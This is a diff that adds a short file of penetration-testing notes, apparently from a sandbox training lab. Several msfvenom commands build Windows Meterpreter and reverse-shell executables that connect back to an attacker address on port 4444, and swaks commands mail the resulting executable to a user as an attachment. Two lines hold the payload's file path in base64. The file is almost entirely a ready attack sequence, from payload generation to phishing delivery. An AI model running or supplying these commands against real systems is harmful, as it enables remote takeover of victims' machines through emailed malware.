@@ -1,0 +1,14 @@
+windows/meterpreter/reverse_tcp lhost=192.168.50.158 lport=4444 -f exe -o /home/vit81/Documents/stepik/wh/udp.exe
+
+
+swaks --to mike@sandbox.local --from admin@sandbox.local --server 192.168.56.3 --attach /home/kali/udp.exe
+
+# swaks -t mike@sandbox.local --attach - --server 192.168.56.3 --suppress-data /home/kali/udp.exe
+
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.4 lport=4444 -f exe -o /home/kali/udp.exe
+
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.56.4 LPORT=4444 -f exe -o /home/kali/udp.exe
+
+L2hvbWUva2FsaS91ZHAuZXhl
+L2hvbWUva2FsaS91ZHAuZXhl
